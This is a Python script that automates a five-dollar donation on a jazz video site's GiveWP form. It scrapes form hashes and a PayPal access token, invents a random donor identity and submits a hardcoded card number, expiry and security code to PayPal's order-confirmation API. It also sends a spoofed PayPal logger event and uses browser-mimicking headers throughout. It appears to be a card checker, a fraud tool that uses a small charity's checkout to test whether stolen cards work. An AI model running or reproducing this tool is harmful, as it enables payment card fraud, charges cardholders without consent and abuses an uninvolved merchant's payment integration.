import requests, re, time, random, string, json, base64
from user_agent import generate_user_agent

def gdata():
    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
    f = random.choice(fnames)
    l = random.choice(lnames)
    num = random.randint(10, 999)
    email = f"{f}.{l}{num}@{random.choice(domains)}"
    name = f"{f.capitalize()} {l.capitalize()}"
    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
    zip = str(random.randint(10000, 99999))
    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return email, name, add, city, zip, phone

email, name, add, city, zip, phone = gdata()
r = requests.Session()
u = generate_user_agent()

resp = r.get('https://jazzonthetube.com/video/support-jazz-on-the-tube/', headers={'User-Agent': u})
html = resp.text

v1 = re.search(r'name="give-form-id-prefix" value="([^"]+)"', html).group(1)
v2 = re.search(r'name="give-form-id" value="([^"]+)"', html).group(1)
x1 = re.search(r'name="give-form-hash" value="([^"]+)"', html).group(1)
x23 = re.search(r'"data-client-token":"([^"]+)"', html).group(1)

x24 = base64.b64decode(x23).decode()
x25 = json.loads(x24)
x26 = x25['paypal']['accessToken']

headers = {
    'Accept': '*/*',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://jazzonthetube.com',
    'Referer': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': u,
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

data = {
    'give-honeypot': '',
    'give-form-id-prefix': v1,
    'give-form-id': v2,
    'give-form-title': 'One Time Donation',
    'give-current-url': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
    'give-form-url': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
    'give-form-minimum': '5.00',
    'give-form-maximum': '999999.99',
    'give-form-hash': x1,
    'give-price-id': 'custom',
    'give-recurring-logged-in-only': '',
    'give-logged-in-only': '1',
    'give_recurring_donation_details': '{"is_recurring":false}',
    'give-amount': '5.00',
    'give-radio-donation-level': 'custom',
    'give_stripe_payment_method': '',
    'payment-mode': 'paypal-commerce',
    'give_first': 'Tommy',
    'give_last': 'Tommy',
    'give_company_option': 'no',
    'give_company_name': '',
    'give_email': email,
    'card_name': name,
    'card_exp_month': '',
    'card_exp_year': '',
    'billing_country': 'US',
    'card_address': add,
    'card_address_2': '',
    'card_city': city,
    'card_state': 'NY',
    'card_zip': zip,
    'give_action': 'purchase',
    'give-gateway': 'paypal-commerce',
    'action': 'give_process_donation',
    'give_ajax': 'true',
}

response = r.post('https://jazzonthetube.com/video/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)

headers = {
    'Accept': '*/*',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://jazzonthetube.com',
    'Referer': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': u,
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

params = {
    'action': 'give_paypal_commerce_create_order',
}

files = {
    'give-honeypot': (None, ''),
    'give-form-id-prefix': (None, v1),
    'give-form-id': (None, v2),
    'give-form-title': (None, 'One Time Donation'),
    'give-current-url': (None, 'https://jazzonthetube.com/video/support-jazz-on-the-tube/'),
    'give-form-url': (None, 'https://jazzonthetube.com/video/support-jazz-on-the-tube/'),
    'give-form-minimum': (None, '5.00'),
    'give-form-maximum': (None, '999999.99'),
    'give-form-hash': (None, x1),
    'give-price-id': (None, 'custom'),
    'give-recurring-logged-in-only': (None, ''),
    'give-logged-in-only': (None, '1'),
    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
    'give-amount': (None, '5.00'),
    'give-radio-donation-level': (None, 'custom'),
    'give_stripe_payment_method': (None, ''),
    'payment-mode': (None, 'paypal-commerce'),
    'give_first': (None, name),
    'give_last': (None, name),
    'give_company_option': (None, 'no'),
    'give_company_name': (None, ''),
    'give_email': (None, email),
    'card_name': (None, name),
    'card_exp_month': (None, ''),
    'card_exp_year': (None, ''),
    'billing_country': (None, 'US'),
    'card_address': (None, add),
    'card_address_2': (None, ''),
    'card_city': (None, city),
    'card_state': (None, 'NY'),
    'card_zip': (None, zip),
    'give-gateway': (None, 'paypal-commerce'),
}

response = r.post(
    'https://jazzonthetube.com/video/wp-admin/admin-ajax.php',
    params=params,
    cookies=r.cookies,
    headers=headers,
    files=files,
)
xdata = (response.json()['data']['id'])

headers = {
    'authority': 'cors.api.paypal.com',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'access-control-request-headers': 'authorization,braintree-sdk-version,content-type,paypal-client-metadata-id',
    'access-control-request-method': 'POST',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': u,
}

response = r.options(
    f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source',
    headers=headers,
)

headers = {
    'authority': 'cors.api.paypal.com',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {x26}',
    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': u,
}

json_data = {
    'payment_source': {
        'card': {
            'number': '4125250545305008',
            'expiry': '2029-11',
            'security_code': '326',
            'attributes': {
                'verification': {
                    'method': 'SCA_WHEN_REQUIRED',
                },
            },
        },
    },
    'application_context': {
        'vault': False,
    },
}

response = r.post(
    f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source',
    headers=headers,
    json=json_data,
)


headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://jazzonthetube.com',
    'referer': 'https://jazzonthetube.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': u,
}

params = {
    'disableSetCookie': 'true',
}

json_data = {
    'events': [
        {
            'level': 'info',
            'event': 'HOSTEDFIELDS_SUBMIT',
            'payload': {
                'env': 'production',
                'csnwCorrelationId': 'prebuild',
                'referrer': 'jazzonthetube.com',
                'version': '5.0.556',
                'merchantId': [],
                 'userAction': 'commit',
                'loadedInFrame': 'non_paypal',
            },
        },
    ],
    'meta': {},
    'tracking': [
        {
            'state_name': 'CARD_PAYMENT_FORM',
            'transition_name': 'process_receive_order',
            'context_type': 'Cart-ID',
            'context_id': xdata,
            'context_correlation_id': 'prebuild',
            'serverside_data_source': 'checkout',
            'feed_name': 'payments_sdk',
            'js_sdk_library': 'paypal-js',
            'locale': 'fr_FR',
            'pp_placement': 'none',
            'bn_code': 'GiveWP_SP_PPCPV2',
            'referer_url': 'jazzonthetube.com',
            'sdk_integration_source': 'none',
            'sdk_name': 'payments_sdk',
            'sdk_version': '5.0.556',
            'seller_id': '',
            'user_action': 'commit',
            'user_agent': u,
            'loaded_in_frame': 'non_paypal',
        },
    ],
    'metrics': [],
}

response = r.post('https://www.paypal.com/xoplatform/logger/api/logger', params=params, headers=headers, json=json_data)

headers = {
    'Accept': '*/*',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://jazzonthetube.com/video/',
    'Referer': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': u,
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

params = {
    'action': 'give_paypal_commerce_approve_order',
    'order': xdata,
}

files = {
    'give-honeypot': (None, ''),
    'give-form-id-prefix': (None, v1),
    'give-form-id': (None, v2),
    'give-form-title': (None, 'One time donation'),
    'give-current-url': (None, 'https://jazzonthetube.com/video/'),
    'give-form-url': (None, 'https://jazzonthetube.com/video/'),
    'give-form-minimum': (None, '7'),
    'give-form-maximum': (None, '1000000'),
    'give-form-hash': (None, x1),
    'give-price-id': (None, 'custom'),
    'give-recurring-logged-in-only': (None, ''),
    'give-logged-in-only': (None, '1'),
    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
    'give-amount': (None, '7'),
    'give-radio-donation-level': (None, 'custom'),
    'give_stripe_payment_method': (None, ''),
    'payment-mode': (None, 'paypal-commerce'),
    'give_first': (None, name),
    'give_last': (None, name),
    'give_company_option': (None, 'no'),
    'give_company_name': (None, ''),
    'give_email': (None, name),
    'card_name': (None, name),
    'card_exp_month': (None, ''),
    'card_exp_year': (None, ''),
    'billing_country': (None, 'US'),
    'card_address': (None, add),
    'card_address_2': (None, ''),
    'card_city': (None, city),
    'card_state': (None, 'NY'),
    'card_zip': (None, zip),
    'give-gateway': (None, 'paypal-commerce'),
}

response = r.post(
    'https://jazzonthetube.com/video/wp-admin/admin-ajax.php',
    params=params,
    cookies=r.cookies,
    headers=headers,
    files=files,
)

print(response.text)